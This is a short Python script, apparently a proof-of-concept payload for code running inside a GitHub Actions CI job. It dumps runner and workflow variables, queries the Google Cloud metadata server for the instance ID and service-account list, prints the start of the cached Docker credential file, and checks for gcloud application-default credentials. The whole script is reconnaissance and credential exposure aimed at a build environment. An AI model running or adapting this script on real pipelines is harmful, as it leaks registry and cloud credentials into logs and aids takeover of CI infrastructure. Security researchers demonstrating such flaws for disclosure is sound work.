#!/usr/bin/env python3
import os
import socket
import sys
import urllib.request

# quick env dump - proves execution context
print("host:", socket.gethostname())
print("user:", os.environ.get("USER", os.environ.get("USERNAME", "unknown")))

for v in ["GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH",
          "GITHUB_REPOSITORY", "GITHUB_REF", "GITHUB_SHA",
          "GITHUB_ACTOR", "GITHUB_EVENT_NAME", "GITHUB_WORKFLOW"]:
    print(f"{v}: {os.environ.get(v, '')}")

print()

# check gce metadata reachability
print("checking metadata.google.internal...")
try:
    req = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        headers={"Metadata-Flavor": "Google"})
    instance_id = urllib.request.urlopen(req, timeout=5).read().decode().strip()
    print("reachable: yes")
    print("instance-id:", instance_id)

    # service account token endpoint - not fetching, just confirming path
    req2 = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        headers={"Metadata-Flavor": "Google"})
    accounts = urllib.request.urlopen(req2, timeout=5).read().decode().strip()
    print("service-accounts:", accounts)
except Exception as e:
    print("reachable: no -", e)

print()

# check for cached docker creds
docker_cfg = os.path.expanduser("~/.docker/config.json")
if os.path.exists(docker_cfg):
    print("docker config found:", docker_cfg)
    with open(docker_cfg) as f:
        print(f.read()[:300])
else:
    print("docker config: not found")

# gcloud adc
adc = os.path.expanduser("~/.config/gcloud/application_default_credentials.json")
print("gcloud adc:", "found" if os.path.exists(adc) else "not found")

sys.exit(0)
